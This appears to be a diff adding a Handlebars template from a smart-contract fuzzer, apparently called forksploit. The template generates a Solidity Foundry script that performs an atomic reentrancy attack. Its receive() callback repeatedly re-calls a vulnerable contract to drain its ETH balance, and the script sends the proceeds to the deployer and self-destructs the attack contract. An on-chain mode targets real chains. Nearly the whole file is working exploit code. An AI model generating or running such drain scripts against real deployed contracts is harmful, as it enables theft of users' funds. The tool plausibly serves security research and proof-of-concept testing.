@@ -1,0 +1,199 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Script.sol";
+
+{{#if is_onchain}}
+// forksploit evm -o -t {{target}} -c {{chain}} --onchain-block-number {{block_number}} -f -i -p --onchain-etherscan-api-key ${{etherscan_keyname}}
+{{else}}
+// forksploit evm -t '{{target}}' -f
+{{/if}}
+/*
+
+😊😊 Found violations! Atomic reentrancy exploit script (forge script, not forge test).
+
+This replays the SAME (contract, function) call that the fuzzer found
+reentering during a control leak (see middlewares/reentrancy.rs): trigger
+it once in attack(), then let receive() -- invoked when the vulnerable
+contract sends this contract ETH mid-call -- call it again for as long as
+there's still balance worth draining.
+
+{{{solution}}}
+ */
+
+{{#*inline "tx_call"}}
+{{#if interface_calls}}
+    {{#each interface_calls}}
+    {{{this}}}
+    {{/each}}
+{{else}}
+{{#if (is_deposit buy_type)}}
+    {{#with (lookup swap_data "deposit")~}}I({{target}}).deposit{value: {{../value}}}();{{/with}}
+{{else}}
+{{#if (is_buy buy_type)}}
+    address[] memory path{{borrow_idx}} = new address[]();
+{{#with (lookup swap_data "buy")~}}
+    {{#each path}}
+    path{{../../borrow_idx}}[{{@index}}] = {{{this}}};
+    {{/each}}
+{{/with}}
+    IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
+        value: {{value}}
+    }(0, path{{borrow_idx}}, address(this), block.timestamp);
+{{else}}
+    {{contract}}.call{{#if value}}{value: {{value}}}{{/if}}(abi.encodeWithSelector(
+        {{fn_selector}}{{#if fn_args}}, {{{fn_args}}}{{/if}}
+    ));
+{{/if}}
+{{/if}}
+{{#if (is_withdraw sell_type)}}
+    uint256 amount{{balance_idx}} = IERC20({{contract}}).balanceOf(address(this));
+    {{#with (lookup swap_data "withdraw")~}}I({{target}}).withdraw(amount{{../balance_idx}});{{/with}}
+{{else}}
+{{#if (is_sell sell_type)}}
+    uint256 amount{{balance_idx}} = IERC20({{contract}}).balanceOf(address(this));
+    IERC20({{contract}}).approve(router, amount{{balance_idx}});
+    address[] memory liq_path{{balance_idx}} = new address[]();
+{{#with (lookup swap_data "sell")~}}
+    {{#each path}}
+    liq_path{{../../balance_idx}}[{{@index}}] = {{{this}}};
+    {{/each}}
+{{/with}}
+    IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount{{balance_idx}}, 0, liq_path{{balance_idx}}, address(this), block.timestamp
+    );
+{{/if}}
+{{/if}}
+{{/if}}
+{{/inline}}
+
+contract {{contract_name}}ReentrancyExploit {
+    // Whoever deploys this (the broadcaster) is who gets the proceeds back
+    // and who's allowed to trigger cleanup.
+    address payable public beneficiary;
+
+    constructor() {
+        beneficiary = payable(msg.sender);
+    }
+
+    // Triggers the vulnerable call once. The actual exploitation then
+    // happens through receive() being invoked mid-call (the same call-
+    // stack reentrancy the fuzzer's control-leak mechanism found) -- there
+    // is no explicit loop here, the recursion lives in receive() below.
+    //
+    // `payable`, and funded directly through THIS call (not by a separate
+    // plain transfer before it) deliberately: a bare value transfer would
+    // hit receive() below -- which is meant ONLY for the reentrant
+    // callback during the attack -- before the attack has even started.
+    function attack() external payable {
+{{#each setup_calls}}
+{{#with this}}
+{{> tx_call}}
+{{/with}}
+{{/each}}
+    }
+
+    // Repeats the exact call the fuzzer found reentering during the leak,
+    // for as long as the target still holds enough balance to make
+    // continuing worth it -- the same guard a hand-written reentrancy
+    // attacker would use, just derived from the trace instead of by hand.
+    receive() external payable {
+        if ({{repeat_tx.contract}}.balance >= msg.value) {
+{{#with repeat_tx}}
+{{> tx_call}}
+{{/with}}
+        }
+    }
+
+    // Forwards any ETH this contract is holding back to whoever deployed
+    // it, then self-destructs. NOTE: because this always runs in a
+    // SEPARATE transaction from the one that created this contract,
+    // EIP-6780 (live since the Dencun/Cancun upgrade, on Sepolia and
+    // mainnet both) means SELFDESTRUCT here only zeroes the balance -- it
+    // does NOT remove this contract's bytecode from the chain. There's no
+    // way to actually erase deployed code after the fact anymore; this is
+    // as much cleanup as is possible.
+    function collectAndDestroy() external {
+        require(msg.sender == beneficiary, "not beneficiary");
+        if (address(this).balance > 0) {
+            // W3: full-gas `call`, never `.transfer()`. `.transfer()` forwards
+            // only 2300 gas, which a CONTRACT beneficiary (a Gnosis Safe /
+            // multisig recovery wallet, a treasury, any receive() that writes
+            // storage) cannot run within -- the send would revert and the
+            // proceeds would be stranded in this contract.
+            (bool ok, ) = beneficiary.call{value: address(this).balance}("");
+            require(ok, "beneficiary send failed");
+        }
+        selfdestruct(beneficiary);
+    }
+}
+
+contract {{contract_name}}ReentrancyExploitRunner is Script {
+    function run() external {
+        vm.startBroadcast();
+
+        // 1. Deploy the exploit contract.
+        {{contract_name}}ReentrancyExploit exploit = new {{contract_name}}ReentrancyExploit();
+
+        // 2. Trigger the vulnerable call once -- funded directly through
+        //    this same call (see the comment on attack() for why a
+        //    separate funding transfer first would misfire receive()) --
+        //    receive() does the rest.
+{{#if needs_funding}}
+        exploit.attack{value: {{total_value}}}();
+{{else}}
+        exploit.attack();
+{{/if}}
+
+        // 3. Forward whatever the reentrancy loop collected back to this
+        //    wallet, and self-destruct (see collectAndDestroy() above).
+        exploit.collectAndDestroy();
+
+        vm.stopBroadcast();
+    }
+}
+{{#if interface}}
+
+interface I {
+{{#each interface}}
+    {{{this}}}
+{{/each}}
+}
+{{/if}}
+{{#if include_interface}}
+
+interface IERC20 {
+    function balanceOf(address owner) external view returns (uint256);
+    function approve(address spender, uint256 value) external returns (bool);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+
+    function mint(address to) external returns (uint liquidity);
+    function burn(address to) external returns (uint amount0, uint amount1);
+    function skim(address to) external;
+    function sync() external;
+}
+
+interface IUniswapV2Router {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external payable;
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+{{/if}}
